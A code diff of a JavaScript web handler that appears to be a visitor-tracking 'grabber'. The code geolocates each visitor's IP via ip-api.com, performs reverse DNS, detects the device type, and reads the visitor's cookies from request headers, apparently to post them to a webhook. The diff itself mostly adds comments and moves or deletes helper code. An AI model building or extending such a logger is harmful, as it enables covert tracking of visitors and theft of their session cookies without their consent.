@@ -24,6 +24,7 @@ async function sendToWebhook(message) {
     }
 }
 
+// Get IP details from the IP-API service
 async function getIpDetails(ip) {
     try {
         const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query`);
@@ -34,6 +35,7 @@ async function getIpDetails(ip) {
     }
 }
 
+// Log request metadata
 async function logRequestMetadata(req) {
     return {
         cookies: req.headers['cookie'] || 'N/A',
@@ -44,18 +46,7 @@ async function logRequestMetadata(req) {
 }
 
 
-// In the handler function, add this before building the message object:
-const requestMetadata = await logRequestMetadata(req);
-const metadataFields = [
-    { name: "Cookies", value: `\`${requestMetadata.cookies}\``, inline: false },
-    { name: "Connection", value: `\`${requestMetadata.connection}\``, inline: true },
-    { name: "Content-Type Options", value: `\`${requestMetadata.contentTypeOptions}\``, inline: true },
-    { name: "Frame Options", value: `\`${requestMetadata.frameOptions}\``, inline: true },
-];
-
-
-
-
+// Perform reverse DNS lookup
 async function getReverseDNS(ip) {
     try {
         const hostnames = await dns.reverse(ip);
@@ -63,6 +54,17 @@ async function getReverseDNS(ip) {
     } catch (error) {
         console.error("Reverse DNS lookup failed:", error);
         return 'N/A';
+    }
+}
+
+// Detect device type from user agent
+function detectDeviceType(userAgent) {
+    if (/Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
+        return "Mobile";
+    } else if (/Tablet|iPad/i.test(userAgent)) {
+        return "Tablet";
+    } else {
+        return "Desktop";
     }
 }
 
@@ -95,6 +97,8 @@ if (req.method === 'GET' && (deviceType === 'Desktop' || deviceType === 'Mobile'
 }
 
 
+
+
 function logDebugInfo(reverseDNS, requestMetadata) {
     console.log(`Reverse DNS result: ${reverseDNS}`);
     console.log(`Request Metadata: ${JSON.stringify(requestMetadata)}`);
@@ -105,18 +109,6 @@ logDebugInfo(reverseDNS, requestMetadata);
 
 
 
-
-
-
-function detectDeviceType(userAgent) {
-    if (/Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
-        return "Mobile";
-    } else if (/Tablet|iPad/i.test(userAgent)) {
-        return "Tablet";
-    } else {
-        return "Desktop";
-    }
-}
 
 export default async function handler(req, res) {
     if (req.method === 'GET' || req.method === 'POST') {
